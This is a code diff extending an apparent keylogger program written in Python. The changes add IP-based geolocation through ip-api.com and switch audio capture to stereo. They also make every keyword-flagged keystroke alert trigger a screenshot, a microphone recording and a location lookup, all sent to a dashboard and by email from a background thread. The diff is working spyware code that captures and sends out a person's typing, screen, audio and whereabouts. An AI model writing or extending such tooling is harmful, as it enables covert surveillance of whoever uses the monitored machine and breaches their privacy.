@@ -59,6 +59,20 @@ def get_system_info() -> str:
         return "System info unavailable"
 
 
+def get_location_info() -> str:
+    try:
+        resp = requests.get("http://ip-api.com/json/", timeout=5)
+        if resp.status_code == 200:
+            data = resp.json()
+            city = data.get("city", "")
+            country = data.get("countryCode", "")
+            if city or country:
+                return f"{city}, {country}".strip(", ")
+    except Exception:
+        pass
+    return "Location unavailable"
+
+
 def take_screenshot() -> str | None:
     """Capture a screenshot and save it. Returns file path or None."""
     if not ENABLE_SCREENSHOT:
@@ -89,7 +103,7 @@ def record_audio(duration: int = AUDIO_DURATION) -> str | None:
         path = os.path.join(AUDIO_DIR, f"audio_{timestamp}.wav")
         fs = 44100
         logger.info(f"[AUDIO] Recording {duration}s audio...")
-        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype="float32")
+        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype="float32")
         sd.wait()
         recording_int = (recording * 32767).astype("int16")
         wav_write(path, fs, recording_int)
@@ -212,45 +226,38 @@ class KeyLogger:
             f"[{result['category'].upper()}] conf={result['confidence']}%"
         )
 
-        # Run screenshot + audio in parallel threads
-        ss_path = None
-        audio_path = None
-
-        def capture():
-            nonlocal ss_path, audio_path
+        def handle_alert():
+            # Capture evidence
             ss_path = take_screenshot()
-            if result["severity"] == "critical":
-                audio_path = record_audio()
-
-        t = threading.Thread(target=capture, daemon=True)
-        t.start()
-        t.join(timeout=35)  # wait for captures
-
-        # Post alert to dashboard
-        post_to_dashboard("alert", {
-            "content": sentence,
-            "category": result["category"],
-            "severity": result["severity"],
-            "confidence": result["confidence"],
-            "application": app,
-            "screenshot_path": ss_path,
-            "audio_path": audio_path,
-        })
-
-        # Send email in background
-        threading.Thread(
-            target=self.email_service.send_alert,
-            kwargs={
-                "subject": f"{result['category'].replace('_', ' ').title()} keyword detected",
+            audio_path = record_audio()
+            location = get_location_info()
+                
+            # Post alert to dashboard
+            post_to_dashboard("alert", {
                 "content": sentence,
                 "category": result["category"],
                 "severity": result["severity"],
                 "confidence": result["confidence"],
+                "application": app,
+                "location": location,
                 "screenshot_path": ss_path,
                 "audio_path": audio_path,
-            },
-            daemon=True,
-        ).start()
+            })
+
+            # Send email
+            self.email_service.send_alert(
+                subject=f"{result['category'].replace('_', ' ').title()} keyword detected",
+                content=sentence,
+                category=result["category"],
+                severity=result["severity"],
+                confidence=result["confidence"],
+                screenshot_path=ss_path,
+                audio_path=audio_path,
+            )
+
+        # Run completely in background so keylogger isn't blocked
+        t = threading.Thread(target=handle_alert, daemon=True)
+        t.start()
 
     def run(self):
         """Start the keylogger listener."""
